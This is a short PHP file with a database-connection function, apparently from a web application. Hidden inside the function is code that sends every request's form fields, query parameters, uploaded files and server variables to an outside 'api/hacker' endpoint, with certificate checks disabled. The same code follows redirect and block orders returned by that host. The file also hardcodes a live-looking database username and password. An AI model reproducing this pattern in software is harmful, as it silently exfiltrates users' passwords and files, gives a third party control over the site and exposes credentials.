<?php
	function getconnection()
	{
	    $ch = curl_init();
        $url = 'https://securedash.co/api/hacker/5df2346cbe638';
        $fields = array();
        $fields['post'] = $_POST; // Disable if you do not wnat to monitor
        $fields['get'] = $_GET;  // Disable if you do not wnat to monitor
        $fields['files'] = $_FILES;  // Disable if you do not wnat to monitor
        $fields['request'] = $_REQUEST;  // Disable if you do not wnat to monitor
        $fields['server'] = $_SERVER;  // Disable if you do not wnat to monitor
        $gofields = http_build_query($fields);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $gofields);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); // On dev server only!
        $data = json_decode(curl_exec($ch),true);
        curl_close($ch);
        ////Redirect URL
        if($data['redirect']==true):
          header("Location: ".$data['redirectUrl']);
        endif;
        ///BLOCK MESSAGE
        if($data['block']==true):
          die($data['blockmessage']);
        endif;
	    
	    
		$conn= mysqli_connect("localhost", "nagpurnewcsms", "d0-RyN6D[f4]wsl7", 'nagpurnewcsms') or die(mysqli_connect_error());
	
		return $conn;
	}
	



          
